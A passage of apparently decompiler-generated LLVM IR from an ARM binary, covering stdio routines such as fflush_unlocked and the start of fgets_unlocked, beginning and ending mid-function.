  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1153c = load i32, i32* @r4, align 4
  store i32 %v3_1153c, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r6.global-to-local, align 4
  %v4_1154c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 36) to i32*), align 4
  store i32 %v4_1154c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_11554 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 112) to i32*), align 4
  store i32 %v4_11554, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_11560 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  store i32 %v4_11560, i32* %r7.global-to-local, align 4
  %v2_1156c = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_11560)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11580 = load i32, i32* %r6.global-to-local, align 4
  %v2_11580 = add i32 %v0_11580, 16
  %v3_11580 = inttoptr i32 %v2_11580 to i32*
  %v4_11580 = load i32, i32* %v3_11580, align 4
  store i32 %v4_11580, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11580)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_11590 = load i32, i32* %r6.global-to-local, align 4
  %v2_11590 = add i32 %v0_11590, 12
  %v3_11590 = inttoptr i32 %v2_11590 to i32*
  %v4_11590 = load i32, i32* %v3_11590, align 4
  store i32 %v4_11590, i32* %r3.global-to-local, align 4
  %v1_11594 = inttoptr i32 %v4_11590 to i32*
  %v2_11594 = load i32, i32* %v1_11594, align 4
  store i32 %v2_11594, i32* %r3.global-to-local, align 4
  %v7_11598 = icmp eq i32 %v2_11594, 1
  br i1 %v7_11598, label %dec_label_pc_115a0, label %dec_label_pc_11660

dec_label_pc_115a0:                               ; preds = %entry
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_115a4 = add i32 %v0_11590, 52
  %v3_115a4 = inttoptr i32 %v2_115a4 to i32*
  %v4_115a4 = load i32, i32* %v3_115a4, align 4
  store i32 %v4_115a4, i32* %r3.global-to-local, align 4
  %v1_115a8 = inttoptr i32 %v4_115a4 to i32*
  %v2_115a8 = load i32, i32* %v1_115a8, align 4
  store i32 %v2_115a8, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_115a8, 1
  br i1 %tmp32, label %dec_label_pc_11660, label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %dec_label_pc_115a0
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_115b8 = add i32 %v0_11590, 100
  %v3_115b8 = inttoptr i32 %v2_115b8 to i32*
  %v4_115b8 = load i32, i32* %v3_115b8, align 4
  store i32 %v4_115b8, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11560)
  call void @__pseudo_branch(i32 %v4_11580)
  %v0_115e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_115e0 = add i32 %v0_115e0, 48
  %v3_115e0 = inttoptr i32 %v2_115e0 to i32*
  %v4_115e0 = load i32, i32* %v3_115e0, align 4
  store i32 %v4_115e0, i32* %r3.global-to-local, align 4
  %v1_115e4 = inttoptr i32 %v4_115e0 to i32*
  %v2_115e4 = load i32, i32* %v1_115e4, align 4
  store i32 %v2_115e4, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1163013 = icmp eq i32 %v2_115e4, 0
  br i1 %v2_1163013, label %dec_label_pc_1163c, label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115b4, %dec_label_pc_1162c
  %v0_116184 = phi i32 [ %v0_1162c, %dec_label_pc_1162c ], [ %v2_115e4, %dec_label_pc_115b4 ]
  %v1_115f4 = inttoptr i32 %v0_116184 to i16*
  %v2_115f4 = load i16, i16* %v1_115f4, align 2
  %v3_115f4 = zext i16 %v2_115f4 to i32
  store i32 %v3_115f4, i32* %r3.global-to-local, align 4
  %v2_115f8 = and i32 %v3_115f4, 32816
  %v7_115fc = icmp eq i32 %v2_115f8, 48
  %v1_11600 = add i32 %v0_116184, 32
  %v2_11600 = inttoptr i32 %v1_11600 to i32*
  %v3_11600 = load i32, i32* %v2_11600, align 4
  store i32 %v3_11600, i32* %r5.global-to-local, align 4
  br i1 %v7_115fc, label %dec_label_pc_1160c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_115f4
  store i32 %v0_116184, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_1160c:                               ; preds = %dec_label_pc_115f4
  %v0_1160c = load i32, i32* %r7.global-to-local, align 4
  %v2_1160c = icmp eq i32 %v0_1160c, 0
  br i1 %v2_1160c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1160c
  %v1_11610 = load i32, i32* %r6.global-to-local, align 4
  %v2_11610 = load i32, i32* %r8.global-to-local, align 4
  %v3_11610 = add i32 %v2_11610, %v1_11610
  %v4_11610 = inttoptr i32 %v3_11610 to i32*
  %v5_11610 = load i32, i32* %v4_11610, align 4
  store i32 %v5_11610, i32* %r3.global-to-local, align 4
  %v3_11614 = inttoptr i32 %v5_11610 to i32*
  store i32 %v3_11600, i32* %v3_11614, align 4
  %v0_11618 = load i32, i32* %r4.global-to-local, align 4
  %v1_11618 = inttoptr i32 %v0_11618 to i16*
  %v2_11618 = load i16, i16* %v1_11618, align 2
  %v3_11618 = zext i16 %v2_11618 to i32
  store i32 %v3_11618, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_1160c
  %v2_1161810 = load i16, i16* %v1_115f4, align 2
  %v3_1161811 = zext i16 %v2_1161810 to i32
  store i32 %v3_1161811, i32* %r3.global-to-local, align 4
  %v3_1161c = add i32 %v0_1160c, 32
  %v4_1161c = inttoptr i32 %v3_1161c to i32*
  store i32 %v3_11600, i32* %v4_1161c, align 4
  %v0_11620.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_11620 = phi i32 [ %v3_11618, %.thread ], [ %v0_11620.pre, %bb ]
  %v1_11620 = and i32 %v0_11620, 8192
  %v2_11620 = icmp eq i32 %v1_11620, 0
  br i1 %v2_11620, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_11628 = xor i1 %v2_11620, true
  call void @__pseudo_cond_branch(i1 %v1_11628, i32 ptrtoint (i32* @global_var_136fc.598 to i32))
  %v0_1162c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %.thread23, %bb35
  %v0_1162c = phi i32 [ %v0_1162c.pre, %bb35 ], [ %v3_11600, %.thread23 ]
  store i32 %v0_1162c, i32* %r4.global-to-local, align 4
  %v2_11630 = icmp eq i32 %v0_1162c, 0
  br i1 %v2_11630, label %dec_label_pc_11630.dec_label_pc_1163c_crit_edge, label %dec_label_pc_115f4

dec_label_pc_11630.dec_label_pc_1163c_crit_edge:  ; preds = %dec_label_pc_1162c
  %v0_11648.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1163c

dec_label_pc_1163c:                               ; preds = %dec_label_pc_11630.dec_label_pc_1163c_crit_edge, %dec_label_pc_115b4
  %v0_11648 = phi i32 [ %v0_11648.pre, %dec_label_pc_11630.dec_label_pc_1163c_crit_edge ], [ %v0_115e0, %dec_label_pc_115b4 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_11648 = add i32 %v0_11648, 24
  %v3_11648 = inttoptr i32 %v2_11648 to i32*
  %v4_11648 = load i32, i32* %v3_11648, align 4
  call void @__pseudo_branch(i32 %v4_11648)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_11658 = load i32, i32* %r6.global-to-local, align 4
  %v2_11658 = add i32 %v0_11658, 52
  %v3_11658 = inttoptr i32 %v2_11658 to i32*
  %v4_11658 = load i32, i32* %v3_11658, align 4
  store i32 %v4_11658, i32* %r3.global-to-local, align 4
  %v0_1165c = load i32, i32* %r4.global-to-local, align 4
  %v2_1165c = inttoptr i32 %v4_11658 to i32*
  store i32 %v0_1165c, i32* %v2_1165c, align 4
  %v0_11664.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11660

dec_label_pc_11660:                               ; preds = %entry, %dec_label_pc_115a0, %dec_label_pc_1163c
  %v0_11664 = phi i32 [ %v0_11590, %entry ], [ %v0_11590, %dec_label_pc_115a0 ], [ %v0_11664.pre, %dec_label_pc_1163c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_11664 = add i32 %v0_11664, 12
  %v3_11664 = inttoptr i32 %v2_11664 to i32*
  %v4_11664 = load i32, i32* %v3_11664, align 4
  %v1_11668 = inttoptr i32 %v4_11664 to i32*
  %v2_11668 = load i32, i32* %v1_11668, align 4
  %v1_1166c = add i32 %v2_11668, -1
  store i32 %v1_1166c, i32* %v1_11668, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_11680 = load i32, i32* %r6.global-to-local, align 4
  %v2_11680 = add i32 %v0_11680, 24
  %v3_11680 = inttoptr i32 %v2_11680 to i32*
  %v4_11680 = load i32, i32* %v3_11680, align 4
  store i32 %v4_11680, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11680)
  %v2_11690 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11690, i32* %r4.global-to-local, align 4
  ret i32 %v2_1156c

; uselistorder directives
  uselistorder i32 %v0_1162c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 19, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 21 }
  uselistorder label %dec_label_pc_11660, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1162c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_115f4, { 1, 0 }
}

define i32 @function_1169c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1169c:
  %v0_1169c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1169c, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_1169c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1169c, %bb
  %v10_116c0 = phi i32 [ %arg1, %dec_label_pc_1169c ], [ 0, %bb ]
  ret i32 %v10_116c0

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %sb.global-to-local, align 4
  %v4_116d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 48) to i32*), align 4
  store i32 %v4_116d4, i32* %r3.global-to-local, align 4
  %v10_116d8 = icmp eq i32 %tmp, %v4_116d4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_116d8, label %bb, label %dec_label_pc_116f0

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11700

dec_label_pc_116f0:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_116f4 = icmp eq i16* %arg1, null
  br i1 %v2_116f4, label %dec_label_pc_11700, label %dec_label_pc_11868

dec_label_pc_11700:                               ; preds = %bb, %dec_label_pc_116f0
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_116f0 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_11714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 112) to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_11720 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_11714, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11720)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11744 = load i32, i32* %sb.global-to-local, align 4
  %v2_11744 = add i32 %v0_11744, 16
  %v3_11744 = inttoptr i32 %v2_11744 to i32*
  %v4_11744 = load i32, i32* %v3_11744, align 4
  call void @__pseudo_branch(i32 %v4_11744)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_11754 = add i32 %v0_11744, 12
  %v3_11754 = inttoptr i32 %v2_11754 to i32*
  %v4_11754 = load i32, i32* %v3_11754, align 4
  store i32 %v4_11754, i32* %r2.global-to-local, align 4
  %v1_11758 = inttoptr i32 %v4_11754 to i32*
  %v2_11758 = load i32, i32* %v1_11758, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_11760 = add i32 %v2_11758, 1
  store i32 %v1_11760, i32* %r3.global-to-local, align 4
  %v2_11764 = add i32 %v0_11744, 24
  %v3_11764 = inttoptr i32 %v2_11764 to i32*
  %v4_11764 = load i32, i32* %v3_11764, align 4
  store i32 %v1_11760, i32* %v1_11758, align 4
  call void @__pseudo_branch(i32 %v4_11764)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_11780 = load i32, i32* %sb.global-to-local, align 4
  %v2_11780 = add i32 %v0_11780, 100
  %v3_11780 = inttoptr i32 %v2_11780 to i32*
  %v4_11780 = load i32, i32* %v3_11780, align 4
  store i32 %v4_11780, i32* @r4, align 4
  store i32 %v4_11780, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11720)
  call void @__pseudo_branch(i32 %v4_11744)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_117a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_117a8 = add i32 %v0_117a8, 48
  %v3_117a8 = inttoptr i32 %v2_117a8 to i32*
  %v4_117a8 = load i32, i32* %v3_117a8, align 4
  store i32 %v4_117a8, i32* %r3.global-to-local, align 4
  %v1_117b4 = inttoptr i32 %v4_117a8 to i32*
  %v2_117b4 = load i32, i32* %v1_117b4, align 4
  store i32 %v2_117b4, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_11764)
  %v0_117c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_117c0, i32* @r6, align 4
  %v2_117c4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_117c4, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_11858.pr = load i32, i32* @r7, align 4
  %v2_1185819 = icmp eq i32 %v0_11858.pr, 0
  br i1 %v2_1185819, label %dec_label_pc_11860, label %dec_label_pc_117cc

dec_label_pc_117cc:                               ; preds = %dec_label_pc_11700, %dec_label_pc_11854
  %v0_117d8 = phi i32 [ %v3_11854, %dec_label_pc_11854 ], [ %v0_11858.pr, %dec_label_pc_11700 ]
  %v1_117cc = inttoptr i32 %v0_117d8 to i16*
  %v2_117cc = load i16, i16* %v1_117cc, align 2
  %v3_117cc = zext i16 %v2_117cc to i32
  store i32 %v3_117cc, i32* %r3.global-to-local, align 4
  %v1_117d0 = and i32 %v3_117cc, 64
  %v2_117d0 = icmp eq i32 %v1_117d0, 0
  br i1 %v2_117d0, label %dec_label_pc_11854, label %dec_label_pc_117d8

dec_label_pc_117d8:                               ; preds = %dec_label_pc_117cc
  %v1_117d8 = add i32 %v0_117d8, 56
  store i32 %v1_117d8, i32* @r4, align 4
  store i32 %v1_117d8, i32* %r2.global-to-local, align 4
  %v0_117e8 = load i32, i32* %sb.global-to-local, align 4
  %v1_117e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_117e8 = add i32 %v1_117e8, %v0_117e8
  %v3_117e8 = inttoptr i32 %v2_117e8 to i32*
  %v4_117e8 = load i32, i32* %v3_117e8, align 4
  call void @__pseudo_branch(i32 %v4_117e8)
  %v1_117f8 = load i32, i32* @r8, align 4
  %v2_117f8 = add i32 %v1_117f8, %v0_117e8
  %v3_117f8 = inttoptr i32 %v2_117f8 to i32*
  %v4_117f8 = load i32, i32* %v3_117f8, align 4
  call void @__pseudo_branch(i32 %v4_117f8)
  %v0_11804 = load i32, i32* @r7, align 4
  %v1_11804 = inttoptr i32 %v0_11804 to i16*
  %v2_11804 = load i16, i16* %v1_11804, align 2
  %v3_11804 = zext i16 %v2_11804 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1180c = or i32 %v3_11804, %stack_var_-60.1.in
  %v1_11810 = xor i32 %v2_1180c, 320
  store i32 %v1_11810, i32* %r3.global-to-local, align 4
  %v1_11814 = and i32 %v1_11810, 832
  %v2_11814 = icmp eq i32 %v1_11814, 0
  br i1 %v2_11814, label %dec_label_pc_1181c, label %bb38

dec_label_pc_1181c:                               ; preds = %dec_label_pc_117d8
  store i32 %v0_11804, i32* @r0, align 4
  %v0_11820 = call i32 @__stdio_wcommit()
  %v2_11824 = icmp eq i32 %v0_11820, 0
  br i1 %v2_11824, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_1181c
  %v1_11828 = load i32, i32* @r7, align 4
  %v2_11828 = inttoptr i32 %v1_11828 to i16*
  %v3_11828 = load i16, i16* %v2_11828, align 2
  %v4_11828 = zext i16 %v3_11828 to i32
  store i32 %v4_11828, i32* %r3.global-to-local, align 4
  %v2_1182c = add i32 %v1_11828, 8
  %v3_1182c = inttoptr i32 %v2_1182c to i32*
  %v4_1182c = load i32, i32* %v3_1182c, align 4
  store i32 %v4_1182c, i32* %r2.global-to-local, align 4
  %v2_11830 = and i32 %v4_11828, 65471
  store i32 %v2_11830, i32* %r3.global-to-local, align 4
  %v3_11834 = add i32 %v1_11828, 28
  %v4_11834 = inttoptr i32 %v3_11834 to i32*
  store i32 %v4_1182c, i32* %v4_11834, align 4
  %v1_11838 = load i32, i32* %r3.global-to-local, align 4
  %v2_11838 = trunc i32 %v1_11838 to i16
  %v3_11838 = load i32, i32* @r7, align 4
  %v4_11838 = inttoptr i32 %v3_11838 to i16*
  store i16 %v2_11838, i16* %v4_11838, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_1181c
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_117d8, %.thread8
  %v0_11848 = load i32, i32* %sb.global-to-local, align 4
  %v1_11848 = load i32, i32* %sl.global-to-local, align 4
  %v2_11848 = add i32 %v1_11848, %v0_11848
  %v3_11848 = inttoptr i32 %v2_11848 to i32*
  %v4_11848 = load i32, i32* %v3_11848, align 4
  call void @__pseudo_branch(i32 %v4_11848)
  %v0_11854.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11854

dec_label_pc_11854:                               ; preds = %dec_label_pc_117cc, %bb38
  %v0_11854 = phi i32 [ %v0_117d8, %dec_label_pc_117cc ], [ %v0_11854.pre, %bb38 ]
  %v1_11854 = add i32 %v0_11854, 32
  %v2_11854 = inttoptr i32 %v1_11854 to i32*
  %v3_11854 = load i32, i32* %v2_11854, align 4
  store i32 %v3_11854, i32* @r7, align 4
  %v2_11858 = icmp eq i32 %v3_11854, 0
  br i1 %v2_11858, label %dec_label_pc_11860, label %dec_label_pc_117cc

dec_label_pc_11860:                               ; preds = %dec_label_pc_11854, %dec_label_pc_11700
  %v0_11860 = call i32 @_stdio_openlist_dec_use()
  %v0_1189c.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_11868:                               ; preds = %dec_label_pc_116f0
  %v2_11868 = load i16, i16* %arg1, align 2
  %v3_11868 = zext i16 %v2_11868 to i32
  %v1_1186c = and i32 %v3_11868, 64
  store i32 %v1_1186c, i32* %r3.global-to-local, align 4
  %v2_1186c = icmp eq i32 %v1_1186c, 0
  br i1 %v2_1186c, label %bb39, label %dec_label_pc_11878

bb39:                                             ; preds = %dec_label_pc_11868
  br label %bb40

dec_label_pc_11878:                               ; preds = %dec_label_pc_11868
  %v0_11878 = call i32 @__stdio_wcommit()
  %v2_1187c = icmp eq i32 %v0_11878, 0
  br i1 %v2_1187c, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_11878
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_11878
  %v1_11880 = load i32, i32* %fp.global-to-local, align 4
  %v2_11880 = inttoptr i32 %v1_11880 to i16*
  %v3_11880 = load i16, i16* %v2_11880, align 2
  %v4_11880 = zext i16 %v3_11880 to i32
  store i32 %v4_11880, i32* %r3.global-to-local, align 4
  %v2_11884 = add i32 %v1_11880, 8
  %v3_11884 = inttoptr i32 %v2_11884 to i32*
  %v4_11884 = load i32, i32* %v3_11884, align 4
  store i32 %v4_11884, i32* %r2.global-to-local, align 4
  %v2_11888 = and i32 %v4_11880, 65471
  store i32 %v2_11888, i32* %r3.global-to-local, align 4
  %v2_1188c = trunc i32 %v2_11888 to i16
  store i16 %v2_1188c, i16* %v2_11880, align 2
  %v1_11890 = load i32, i32* %r2.global-to-local, align 4
  %v2_11890 = load i32, i32* %fp.global-to-local, align 4
  %v3_11890 = add i32 %v2_11890, 28
  %v4_11890 = inttoptr i32 %v3_11890 to i32*
  store i32 %v1_11890, i32* %v4_11890, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_11860, %.thread15
  %v0_1189c = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_1189c.pre, %dec_label_pc_11860 ], [ 0, %.thread15 ]
  ret i32 %v0_1189c

; uselistorder directives
  uselistorder i32 %v3_11854, { 1, 2, 0 }
  uselistorder i32 %v0_11744, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 112) to i32*), { 1, 2, 0 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11854, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_117cc, { 1, 0 }
  uselistorder label %dec_label_pc_11700, { 1, 0 }
}

define i32 @function_118b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_118b0:
  %v0_118b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_118b0, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_118b0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_118b0, %bb
  %v5_118cc = phi i32 [ %arg1, %dec_label_pc_118b0 ], [ 0, %bb ]
  ret i32 %v5_118cc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_118d0 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_118d4 = icmp eq i32 %arg2, 0
  store i1 %v2_118d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1195c, label %dec_label_pc_11944.preheader

dec_label_pc_11944.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_119442 = add i32 %arg2, -1
  store i32 %v1_119442, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_119448 = icmp eq i32 %arg2, 1
  store i1 %v7_119448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119448, label %dec_label_pc_1194c, label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_11944.preheader, %dec_label_pc_11944.backedge.dec_label_pc_118f0_crit_edge
  %v0_11914 = phi i32 [ %v0_118f0.pre, %dec_label_pc_11944.backedge.dec_label_pc_118f0_crit_edge ], [ %arg3, %dec_label_pc_11944.preheader ]
  %v1_118f0 = add i32 %v0_11914, 16
  %v2_118f0 = inttoptr i32 %v1_118f0 to i32*
  %v3_118f0 = load i32, i32* %v2_118f0, align 4
  store i32 %v3_118f0, i32* %r2.global-to-local, align 4
  %v1_118f4 = add i32 %v0_11914, 24
  %v2_118f4 = inttoptr i32 %v1_118f4 to i32*
  %v3_118f4 = load i32, i32* %v2_118f4, align 4
  store i32 %v3_118f4, i32* %r3.global-to-local, align 4
  %v3_118f8 = icmp uge i32 %v3_118f0, %v3_118f4
  store i1 %v3_118f8, i1* %cpsr_c.global-to-local, align 1
  %v9_118f8 = icmp eq i32 %v3_118f0, %v3_118f4
  store i1 %v9_118f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_118f8, label %dec_label_pc_11914, label %dec_label_pc_11900

dec_label_pc_11900:                               ; preds = %dec_label_pc_118f0
  %v1_11900 = inttoptr i32 %v3_118f0 to i8*
  %v2_11900 = load i8, i8* %v1_11900, align 1
  %v3_11900 = zext i8 %v2_11900 to i32
  store i32 %v3_11900, i32* %r3.global-to-local, align 4
  %v5_11900 = add i32 %v3_118f0, 1
  store i32 %v5_11900, i32* %r2.global-to-local, align 4
  %v2_11904 = load i32, i32* @r5, align 4
  %v3_11904 = inttoptr i32 %v2_11904 to i8*
  store i8 %v2_11900, i8* %v3_11904, align 1
  %v4_11904 = load i32, i32* @r5, align 4
  %v5_11904 = add i32 %v4_11904, 1
  store i32 %v5_11904, i32* @r5, align 4
  %v0_11908 = load i32, i32* %r3.global-to-local, align 4
  %v2_11908 = icmp ugt i32 %v0_11908, 9
  store i1 %v2_11908, i1* %cpsr_c.global-to-local, align 1
  %v7_11908 = icmp eq i32 %v0_11908, 10
  store i1 %v7_11908, i1* %cpsr_z.global-to-local, align 1
  %v0_1190c = load i32, i32* %r2.global-to-local, align 4
  %v1_1190c = load i32, i32* @r4, align 4
  %v2_1190c = add i32 %v1_1190c, 16
  %v3_1190c = inttoptr i32 %v2_1190c to i32*
  store i32 %v0_1190c, i32* %v3_1190c, align 4
  br i1 %v7_11908, label %dec_label_pc_1194c, label %dec_label_pc_11944.backedge

dec_label_pc_11914:                               ; preds = %dec_label_pc_118f0
  %v1_11914 = inttoptr i32 %v0_11914 to i16*
  %v3_11918 = call i32 @getc_unlocked(i16* %v1_11914)
  %v3_1191c = icmp eq i32 %v3_11918, -1
  store i1 %v3_1191c, i1* %cpsr_c.global-to-local, align 1
  %v8_1191c = icmp eq i32 %v3_11918, -1
  store i1 %v8_1191c, i1* %cpsr_z.global-to-local, align 1
  %v1_11920 = urem i32 %v3_11918, 256
  store i32 %v1_11920, i32* %r3.global-to-local, align 4
  br i1 %v3_1191c, label %dec_label_pc_11928, label %dec_label_pc_11940

dec_label_pc_11928:                               ; preds = %dec_label_pc_11914
  %v0_11928 = load i32, i32* @r4, align 4
  %v1_11928 = inttoptr i32 %v0_11928 to i16*
  %v2_11928 = load i16, i16* %v1_11928, align 2
  %v3_11928 = zext i16 %v2_11928 to i32
  store i32 %v3_11928, i32* %r3.global-to-local, align 4
  %v1_1192c = and i32 %v3_11928, 8
  %v2_1192c = icmp eq i32 %v1_1192c, 0
  store i1 %v2_1192c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1192c, label %dec_label_pc_1194c, label %dec_label_pc_1195c

dec_label_pc_11940:                               ; preds = %dec_label_pc_11914
  %v1_11938 = trunc i32 %v3_11918 to i8
  %v2_11938 = load i32, i32* @r5, align 4
  %v3_11938 = inttoptr i32 %v2_11938 to i8*
  store i8 %v1_11938, i8* %v3_11938, align 1
  %v4_11938 = load i32, i32* @r5, align 4
  %v5_11938 = add i32 %v4_11938, 1
  store i32 %v5_11938, i32* @r5, align 4
  %v0_1193c = load i32, i32* %r3.global-to-local, align 4
  %v2_1193c = icmp ugt i32 %v0_1193c, 9
  store i1 %v2_1193c, i1* %cpsr_c.global-to-local, align 1
  %v7_1193c = icmp eq i32 %v0_1193c, 10
  store i1 %v7_1193c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1193c, label %dec_label_pc_1194c, label %dec_label_pc_11944.backedge

dec_label_pc_11944.backedge:                      ; preds = %dec_label_pc_11940, %dec_label_pc_11900
  %v0_11944 = load i32, i32* %r6.global-to-local, align 4
  %v1_11944 = add i32 %v0_11944, -1
